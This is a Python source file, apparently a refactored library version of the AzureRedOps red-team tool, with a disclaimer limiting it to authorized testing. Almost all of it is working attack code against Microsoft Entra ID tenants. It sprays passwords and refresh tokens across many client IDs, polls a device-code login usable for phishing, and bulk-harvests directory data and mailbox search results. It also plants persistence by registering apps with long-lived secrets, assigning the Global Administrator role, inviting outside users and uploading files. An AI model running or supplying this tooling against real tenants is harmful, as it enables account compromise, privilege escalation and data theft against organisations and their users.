# AzureRedOps core service layer.
#
# This is a refactor of the original AzureRedOps.py (Mr.Un1k0d3r, TrueCyber Inc)
# into a library that:
#   * returns structured data instead of printing
#   * streams human-readable log lines through an `emit` callback (for the GUI console)
#   * never calls input()/exit() (raises RedOpsError or asks via callbacks instead)
#
# Educational red-team tooling for *authorized* testing only.

import os
import re
import time
import json
import urllib.parse
import datetime

import jwt
import requests


class RedOpsError(Exception):
    """Raised for operational / Azure API errors so the API layer can surface them."""


class CancelledError(Exception):
    """Raised when a long-running job is cancelled."""


def decode_jwt(token: str) -> dict:
    return jwt.decode(token, options={"verify_signature": False})


def extract_guid(data: str) -> str:
    guid_pattern = (
        r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
        r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"
    )
    result = re.findall(guid_pattern, data or "")
    return result[0] if result else ""


# Default OAuth client used by the original tool (Microsoft Office).
DEFAULT_APP_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
GLOBAL_ADMIN_ROLE = "62e90394-69f5-4237-91f9-056ad24d70a7"

INCLUDES_DIR = os.environ.get(
    "AZUREREDOPS_INCLUDES",
    os.path.join(os.path.dirname(__file__), "..", "..", "..", "includes"),
)


class RedOpsService:
    DEFAULT_AUDIENCE = "https://graph.microsoft.com"
    DEFAULT_SCOPE = "openid offline_access"
    DEFAULT_USER_AGENT = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    )
    DEFAULT_ENDPOINT = "microsoftonline.com"
    DATE_ZULU = "%Y-%m-%dT%H:%M:%SZ"
    DATE_STANDARD = "%d-%m-%Y %H:%M:%S"
    DELAY_REQUEST = 5  # device-code poll interval (seconds)

    def __init__(
        self,
        emit=None,
        should_cancel=None,
        endpoint=None,
        user_agent=None,
        audience=None,
        scope=None,
        use_beta=False,
        additional_headers=None,
        filters=None,
    ):
        # emit(message: str, level: str) -> None
        self._emit = emit or (lambda message, level="info": None)
        # should_cancel() -> bool
        self._should_cancel = should_cancel or (lambda: False)
        self.microsoft_endpoint = endpoint or self.DEFAULT_ENDPOINT
        self.user_agent = user_agent or self.DEFAULT_USER_AGENT
        self.default_audience = audience or self.DEFAULT_AUDIENCE
        self.default_scope = scope or self.DEFAULT_SCOPE
        self.use_beta = use_beta
        self.additional_headers = additional_headers or {}
        self.filters = filters or []
        self.session = requests.Session()

    # ----- logging helpers -------------------------------------------------
    def log(self, message, level="info"):
        self._emit(str(message), level)

    def success(self, message):
        self.log(message, "success")

    def error(self, message):
        self.log(message, "error")

    def hint(self, message):
        self.log(message, "hint")

    def action(self, message):
        self.log(message, "action")

    def _check_cancel(self):
        if self._should_cancel():
            raise CancelledError("Job cancelled by operator.")

    # ----- low level http --------------------------------------------------
    def http_request(self, url, headers=None, send_json=True, expect_json=True,
                     verb="POST", data=None):
        if headers is None:
            headers = {}
        headers.setdefault("User-Agent", self.user_agent)
        for key, value in self.additional_headers.items():
            headers.setdefault(key, value)

        try:
            if verb == "POST":
                if send_json and isinstance(data, dict):
                    headers.setdefault("Content-Type", "application/json")
                    response = self.session.post(url, json=data, headers=headers, timeout=60)
                else:
                    headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                    response = self.session.post(url, data=data, headers=headers, timeout=60)
            elif verb == "PUT":
                headers.setdefault("Content-Type", "application/octet-stream")
                response = self.session.put(url, data=data, headers=headers, timeout=120)
            else:
                response = self.session.get(url, headers=headers, timeout=60)

            if expect_json:
                try:
                    return response.json()
                except ValueError:
                    return {"error": "invalid_response", "error_description": response.text[:500]}
            return response.text
        except requests.RequestException as exc:
            raise RedOpsError(str(exc)) from exc

    @staticmethod
    def set_authorization_header(headers, token):
        headers["Authorization"] = f"Bearer {token}"
        headers["Content-Type"] = "application/json"
        return headers

    def format_date(self, timestamp, fmt=None):
        return datetime.datetime.fromtimestamp(timestamp).strftime(fmt or self.DATE_STANDARD)

    def now(self):
        return time.time()

    def _filtered(self, item: dict) -> dict:
        if not self.filters:
            return item
        return {k: v for k, v in item.items() if any(f in k for f in self.filters)}

    # ----- tenant id -------------------------------------------------------
    def get_tenant_id(self, tenant):
        self.action(f"Resolving tenant for '{tenant}'.")
        response = self.http_request(
            f"https://login.{self.microsoft_endpoint}/{tenant}/v2.0/.well-known/openid-configuration",
            verb="GET",
        )
        if "token_endpoint" in response:
            token_endpoint = response["token_endpoint"]
            tenant_id = extract_guid(token_endpoint)
            self.success(f"Tenant ID: {tenant_id}")
            return {"tenant": tenant, "token_endpoint": token_endpoint, "tenant_id": tenant_id}
        raise RedOpsError(f"No Azure tenant for the '{tenant}' domain.")

    # ----- authentication --------------------------------------------------
    def auth_password(self, username, password, tenant, appid=None, version="v2.0"):
        appid = appid or DEFAULT_APP_ID
        if version == "v2.0":
            data = {"client_id": appid, "scope": self.default_scope, "username": username,
                    "password": password, "grant_type": "password"}
            url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token"
            response = self.http_request(url, data=data, send_json=False)
        else:
            data = {"client_id": appid, "scope": self.default_scope, "username": username,
                    "password": password, "grant_type": "password",
                    "resource": self.default_audience}
            url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token"
            response = self.http_request(url, data=urllib.parse.urlencode(data), send_json=False)
        return self._handle_token_response(response, username=username)

    def device_code_start(self, appid=None, tenant="common"):
        appid = appid or DEFAULT_APP_ID
        tenant = tenant or "common"
        self.action(f"AppId={appid} Tenant={tenant}")
        data = {"client_id": appid, "resource": self.default_audience}
        response = self.http_request(
            f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/devicecode",
            data=data, send_json=False,
        )
        if "error" in response:
            raise RedOpsError(response.get("error_description", response["error"]))
        self.success("Device code generated.")
        self.log(f"URL: https://microsoft.com/devicelogin")
        self.log(f"User code: {response['user_code']}")
        return {
            "verification_url": "https://microsoft.com/devicelogin",
            "user_code": response["user_code"],
            "device_code": response["device_code"],
            "expires_in": response.get("expires_in"),
            "interval": response.get("interval", self.DELAY_REQUEST),
            "appid": appid,
            "tenant": tenant,
        }

    def device_code_capture(self, device_code, appid=None, tenant="common"):
        appid = appid or DEFAULT_APP_ID
        tenant = tenant or "common"
        data = {"client_id": appid, "resource": self.default_audience,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "code": device_code}
        url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token"
        while True:
            self._check_cancel()
            self.action("Polling for authentication token...")
            time.sleep(self.DELAY_REQUEST)
            response = self.http_request(url, data=data, send_json=False)
            if "error" in response:
                desc = response.get("error_description", "")
                if "Authorization is pending" not in desc and "authorization_pending" not in response["error"]:
                    raise RedOpsError(desc or response["error"])
            else:
                return self._handle_token_response(response)

    def refresh(self, refresh_token, tenant, appid=None, version="v2.0", return_raw=False):
        appid = appid or DEFAULT_APP_ID
        if version == "v2.0":
            data = {"client_id": appid, "scope": self.default_scope,
                    "grant_type": "refresh_token", "refresh_token": refresh_token}
            url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token"
            response = self.http_request(url, data=data, send_json=False)
        else:
            data = {"grant_type": "refresh_token", "scope": self.default_scope,
                    "resource": self.default_audience, "client_id": appid,
                    "refresh_token": refresh_token}
            url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token"
            response = self.http_request(url, data=urllib.parse.urlencode(data), send_json=False)
        if return_raw:
            return response
        return self._handle_token_response(response)

    def _handle_token_response(self, response, username=None):
        if "error" in response:
            raise RedOpsError(response.get("error_description", response["error"]))
        access_token = response["access_token"]
        refresh_token = response.get("refresh_token")
        claims = {}
        try:
            claims = decode_jwt(access_token)
        except Exception:
            pass
        self.success(f"Authenticated{(' as ' + claims.get('upn', '')) if claims.get('upn') else ''}.")
        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "username": username or claims.get("upn") or claims.get("unique_name"),
            "tenant_id": claims.get("tid"),
            "scope": claims.get("scp"),
            "expires": claims.get("exp"),
            "expires_human": self.format_date(claims["exp"]) if claims.get("exp") else None,
            "claims": claims,
        }

    @staticmethod
    def inspect_token(access_token):
        claims = decode_jwt(access_token)
        return claims

    # ----- spraying --------------------------------------------------------
    def _load_includes(self, filename):
        path = os.path.join(INCLUDES_DIR, filename)
        with open(path, "r") as handle:
            return json.load(handle)

    def spray_password(self, username, password, tenant, check_privileges=False):
        apps = self._load_includes("auth_apps.json")
        results = []
        for version_key, api in (("v0", "v0"), ("v2.0", "v2.0")):
            self.action(f"Spraying {api} API ({len(apps.get(version_key, []))} apps).")
            for app in apps.get(version_key, []):
                self._check_cancel()
                appname = list(app.keys())[0]
                appid = app[appname]
                if version_key == "v0":
                    data = {"client_id": appid, "scope": self.default_scope, "username": username,
                            "password": password, "grant_type": "password",
                            "resource": self.default_audience}
                    url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token"
                    response = self.http_request(url, data=urllib.parse.urlencode(data), send_json=False)
                else:
                    data = {"client_id": appid, "scope": self.default_scope, "username": username,
                            "password": password, "grant_type": "password"}
                    url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token"
                    response = self.http_request(url, data=data, send_json=False)
                results.append(self._spray_record(response, appname, appid, version_key, check_privileges))
                time.sleep(1)
        return {"username": username, "results": results,
                "successes": [r for r in results if r["success"]]}

    def spray_refresh(self, refresh_token, tenant, check_privileges=False):
        apps = self._load_includes("auth_apps.json")
        results = []
        for version_key in ("v0", "v2.0"):
            self.action(f"Spraying {version_key} API with refresh token.")
            for app in apps.get(version_key, []):
                self._check_cancel()
                appname = list(app.keys())[0]
                appid = app[appname]
                response = self.refresh(refresh_token, tenant, appid,
                                        version=version_key, return_raw=True)
                results.append(self._spray_record(response, appname, appid, version_key, check_privileges))
                time.sleep(1)
        return {"results": results, "successes": [r for r in results if r["success"]]}

    def _spray_record(self, response, appname, appid, version, check_privileges):
        record = {"app": appname, "appid": appid, "version": version, "success": False}
        if "error" not in response:
            record["success"] = True
            token = decode_jwt(response["access_token"]) if response.get("access_token") else {}
            record["scope"] = token.get("scp")
            self.success(f"{appname} ({appid}) login successful.")
            if check_privileges and response.get("access_token"):
                record["privileges"] = self._check_privileges(response["access_token"])
        else:
            record["error"] = response.get("error")
            self.log(f"{appname} ({appid}) failed: {response.get('error')}", "warning")
        return record

    def _check_privileges(self, token):
        privs = {}
        users = self.graph_get(token, "https://graph.microsoft.com/v1.0/users?$top=1")
        privs["can_enumerate_users"] = "error" not in users
        apps = self.graph_get(token, "https://graph.microsoft.com/v1.0/applications?$top=1")
        privs["can_view_applications"] = "error" not in apps
        return privs

    # ----- graph recon -----------------------------------------------------
    def graph_get(self, token, url):
        headers = self.set_authorization_header({}, token)
        return self.http_request(url, verb="GET", headers=headers)

    def graph_self(self, token):
        response = self.graph_get(token, "https://graph.microsoft.com/v1.0/me")
        if "error" in response:
            raise RedOpsError(response["error"])
        self.success("Retrieved current user profile.")
        return self._filtered(response)

    def graph_permission(self, token):
        response = self.graph_get(
            token,
            "https://graph.microsoft.com/beta/policies/authorizationPolicy/authorizationPolicy",
        )
        if "error" in response:
            raise RedOpsError(response["error"])
        return self._filtered(response)

    def graph_read_email(self, token, search):
        url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search}"'
        response = self.graph_get(token, url)
        if "error" in response:
            raise RedOpsError(response["error"])
        return response.get("value", response)

    def graph_collect(self, token, url, max_pages=50):
        """Follow @odata.nextLink and accumulate all values."""
        items = []
        page = 0
        while url and page < max_pages:
            self._check_cancel()
            response = self.graph_get(token, url)
            if "error" in response:
                raise RedOpsError(response.get("error", {}) if isinstance(response.get("error"), str)
                                  else json.dumps(response.get("error")))
            if "value" in response:
                page_items = [self._filtered(i) for i in response["value"]]
                items.extend(page_items)
                self.action(f"Collected {len(items)} records...")
                url = response.get("@odata.nextLink")
            else:
                return [self._filtered(response)]
            page += 1
        return items

    def graph_list_users(self, token, custom_filter=""):
        base = "beta" if self.use_beta else "v1.0"
        return self.graph_collect(token, f"https://graph.microsoft.com/{base}/users{custom_filter}")

    def graph_list_applications(self, token, custom_filter=""):
        base = "beta" if self.use_beta else "v1.0"
        return self.graph_collect(token, f"https://graph.microsoft.com/{base}/applications{custom_filter}")

    def graph_list_principals(self, token):
        return self.graph_collect(token, "https://graph.microsoft.com/v1.0/servicePrincipals")

    def graph_raw_url(self, token, url):
        return self.graph_collect(token, url)

    def graph_gather_all(self, token):
        endpoints = [
            "https://graph.microsoft.com/beta/policies/authorizationPolicy/authorizationPolicy",
            "organization", "policies/authorizationPolicy", "policies/featureRolloutPolicies",
            "policies/conditionalAccessPolicies", "users", "groups", "applications",
            "oauth2PermissionGrants", "servicePrincipals", "directoryRoles",
        ]
        gathered = {}
        for endpoint in endpoints:
            self._check_cancel()
            url = endpoint if endpoint.startswith("http") else f"https://graph.microsoft.com/v1.0/{endpoint}"
            key = endpoint.replace("https://graph.microsoft.com/", "").replace("/", "_")
            self.action(f"Gathering {key}...")
            try:
                gathered[key] = self.graph_collect(token, url)
            except RedOpsError as exc:
                gathered[key] = {"error": str(exc)}
                self.error(f"{key}: {exc}")
        self.success("Gather-all complete.")
        return gathered

    # ----- graph actions ---------------------------------------------------
    def graph_register_app(self, token, name):
        data = {
            "displayName": name, "signInAudience": "AzureADMyOrg",
            "passwordCredentials": [{
                "displayName": f"{name}Secret",
                "startDateTime": self.format_date(self.now(), self.DATE_ZULU),
                "endDateTime": self.format_date(self.now() + 31536000, self.DATE_ZULU),
            }],
        }
        headers = self.set_authorization_header({}, token)
        response = self.http_request("https://graph.microsoft.com/v1.0/applications",
                                     verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            raise RedOpsError(json.dumps(response["error"]))
        self.success(f"Registered application '{name}'.")
        return response

    def graph_create_group(self, token, name):
        data = {"displayName": name, "description": name, "mailEnabled": False,
                "mailNickname": name, "securityEnabled": True}
        headers = self.set_authorization_header({}, token)
        response = self.http_request("https://graph.microsoft.com/v1.0/groups",
                                     verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            raise RedOpsError(json.dumps(response["error"]))
        self.success(f"Created group '{name}'.")
        return response

    def graph_add_role(self, token, uid, gid=None):
        gid = gid or GLOBAL_ADMIN_ROLE
        data = {"@odata.type": "#microsoft.graph.unifiedRoleAssignment",
                "roleDefinitionId": gid, "principalId": uid, "directoryScopeId": "/"}
        headers = self.set_authorization_header({}, token)
        response = self.http_request(
            "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments",
            verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            raise RedOpsError(json.dumps(response["error"]))
        self.success(f"Assigned role {gid} to principal {uid}.")
        return response

    def graph_push_file(self, token, name, content):
        headers = self.set_authorization_header({}, token)
        response = self.http_request(
            f"https://graph.microsoft.com/v1.0/me/drive/root:/{name}:/content",
            verb="PUT", headers=headers, data=content)
        if "error" in response:
            raise RedOpsError(json.dumps(response["error"]))
        self.success(f"Uploaded file '{name}' to OneDrive.")
        return response

    def graph_invite_user(self, token, email, redirect_url=None):
        data = {"invitedUserEmailAddress": email,
                "inviteRedirectUrl": redirect_url or "https://portal.azure.com"}
        headers = self.set_authorization_header({}, token)
        response = self.http_request("https://graph.microsoft.com/beta/invitations",
                                     verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            raise RedOpsError(json.dumps(response["error"]))
        self.success(f"Invited external user '{email}'.")
        return response

    def graph_magic_app_finder(self, token):
        """Find public-client apps with AllPrincipals consent and no assignment requirement."""
        grants = self.graph_collect(token, "https://graph.microsoft.com/v1.0/oauth2PermissionGrants")
        self.action(f"Got {len(grants)} grants.")
        all_principals = list({g.get("clientId") for g in grants
                               if g.get("consentType") == "AllPrincipals" and g.get("clientId")})
        self.action(f"{len(all_principals)} clients with AllPrincipals consent.")
        findings = []
        headers = self.set_authorization_header({}, token)
        for principal in all_principals:
            self._check_cancel()
            time.sleep(0.2)
            sp = self.http_request(
                f"https://graph.microsoft.com/v1.0/servicePrincipals/{principal}",
                verb="GET", headers=headers)
            if sp.get("appRoleAssignmentRequired") is False:
                appid = sp.get("appId")
                app = self.http_request(
                    f"https://graph.microsoft.com/v1.0/applications(appId='{appid}')",
                    verb="GET", headers=headers)
                if "error" in app:
                    continue
                scopes = (app.get("api") or {}).get("oauth2PermissionScopes") or []
                if scopes and scopes[0].get("type") == "User":
                    public_client = app.get("publicClient")
                    if public_client:
                        finding = {
                            "displayName": app.get("displayName"),
                            "appId": app.get("appId"),
                            "redirectUris": public_client.get("redirectUris", []),
                        }
                        findings.append(finding)
                        self.success(f"Candidate: {finding['displayName']} ({finding['appId']})")
        self.success(f"magic-app finished. {len(findings)} candidate(s).")
        return findings

    # ----- reference data --------------------------------------------------
    def reference_known_ids(self):
        return self._load_includes("apps.json").get("apps", [])

    def reference_interest_categories(self):
        data = self._load_includes("auth_apps.json")
        return [{"category": key, "count": len(data[key]) if isinstance(data[key], list) else 0}
                for key in data]

    def reference_interest(self, category=None):
        data = self._load_includes("auth_apps.json")
        out = {}
        for key in data:
            if category is None or key == category:
                out[key] = data[key]
        return out
